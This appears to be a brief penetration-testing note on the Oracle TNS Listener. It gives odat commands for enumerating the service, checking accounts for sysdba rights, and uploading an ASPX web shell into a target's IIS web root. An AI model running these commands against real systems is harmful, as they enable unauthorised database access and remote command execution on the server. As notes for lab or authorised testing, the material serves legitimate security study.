# Oracle TNS Listener
Typically port(s) 1521, 1522 - 1529
[This](https://github.com/quentinhardy/odat) repo has good information on the attack surface/vector for Oracle TNS Listener.

Running odat
```bash
$ odat all -s <IP> -p <PORT>
```

This should be enough to get you started.
If you happen to find Service Identifier Names (SID) which are databases, you can begin to enumerate more specifically. 
For instance, see if any of the accounts are sysdba. This will give you the information to mount an attack.
```bash
$ odat all -s 10.10.10.10 -d <SID> -U <USER> -P <PASS> --sysdba
```

You can upload files using dbmadvisor (sanity check)
```bash
$ odat dbmadvisor -s 10.10.10.10 -D <SID> -U <USER> -P <PASS> --sysdba --putFile C:\\inetpub\\wwwroot webshell.aspx /usr/share/webshells/aspx/cmdasp.aspx
```
